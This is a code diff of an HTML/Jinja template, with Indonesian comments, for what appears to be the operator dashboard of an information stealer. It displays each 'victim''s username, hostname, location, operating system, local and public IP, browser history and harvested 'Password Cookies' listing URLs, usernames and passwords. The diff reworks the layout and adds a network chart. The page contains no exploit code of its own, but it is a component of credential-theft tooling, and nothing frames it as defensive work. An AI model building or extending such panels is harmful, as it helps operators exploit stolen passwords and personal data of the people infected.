@@ -43,16 +43,41 @@
   <!-- Konten utama -->
   <div class="main-content">
 
-    <!-- Kotak data user -->
-    <div class="box beige"><strong>Username: {{ victim.username }}<br>Hostname: {{ victim.hostname }}</strong></div>
-    <div class="box blue"><strong>City: {{ victim.city }}<br>Region: {{ victim.region }}<br>Country: {{ victim.country }}</strong></div>
-    <div class="box gray-green"><strong>Operating System: {{ victim.os }}</strong></div>
-    <div class="box gray-dark"><strong>Local IP: {{ victim.local_ip }}<br>Public IP: {{ victim.public_ip or 'N/A' }}</strong></div>
+  <!-- Kotak data user -->
+  <div class="box beige">
+      <strong>Username:</strong> {{ victim.username }}<br>
+      <strong>Hostname:</strong> {{ victim.hostname }}
+  </div>
+
+  <div class="box blue">
+      <strong>City:</strong> {{ victim.city }}<br>
+      <strong>Region:</strong> {{ victim.region }}<br>
+      <strong>Country:</strong> {{ victim.country }}
+  </div>
+
+  <div class="box gray-green">
+      <strong>Operating System:</strong> {{ victim.os }}
+  </div>
+
+  <div class="box gray-dark">
+      <strong>Local IP:</strong> {{ victim.local_ip }}<br>
+      <strong>Public IP:</strong> {{ victim.public_ip or 'N/A' }}
+  </div>
 
     <!-- Grafik aktivitas jaringan -->
     <div class="box network-chart">
       <strong>Network</strong><br><br>
+
+      <!-- Tambahkan elemen <canvas> di sini -->
+      <canvas id="networkChart"></canvas>
+
+      <!-- Info skala (opsional) -->
+      <p class="scale-info">
+          Data yang ditampilkan dalam grafik telah dikalikan dengan faktor
+          <strong>{{ scale_factor }}</strong> (1.000). Angka sebenarnya adalah hasil perkalian dengan faktor ini.
+      </p>
     </div>
+
 
     <!-- Peta lokasi user -->
     <div class="box location">
@@ -65,44 +90,18 @@
     <!-- Informasi cookies -->
     <div class="box pass-cookies">
       <strong>Password Cookies</strong><br><br>
-      <div class="url">Url : {{ victim.url.split('\n')[0] }}<br>
-       Username : {{ victim.usernames.split('\n')[0] }}<br>
-       Password : {{ victim.passwords.split('\n')[0] }}
-      </div>
-      <div class="url">Url : {{ victim.url.split('\n')[0] }}<br>
-       Username : {{ victim.usernames.split('\n')[0] }}<br>
-       Password : {{ victim.passwords.split('\n')[0] }}
-      </div>
+      <div class="url">total data:</div>
     </div>
 
     <!-- Riwayat browser -->
     <div class="box history-box">
-      <h3>History Browser</h3>
-
-      <!-- Dropdown browser -->
-      <div class="browser-select">
-        <i class="fab fa-chrome"></i>
-        <p><strong>Google Chrome</strong></p>
-      </div>
-
-      <!-- Link-link history -->
-      <div class="links">
-        https://open.spotify.com/<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        https://www.canva.com/design/...<br>
-        ...
-      </div>
+      <strong>History Browser</strong><br><br>
+      <div class="browser">total data:</div>
     </div>
 
     <!-- Info tambahan bawah -->
     <div class="info-tip">
-      <div>To obtain detailed information, select the sidebar now!</div>
+      <div>To obtain detailed information about Password Cookies and History Browser, select the sidebar now!</div>
           
     <div class="logo">
         <img src="/static/image/Logo PBL.png" alt="PBL Logo">
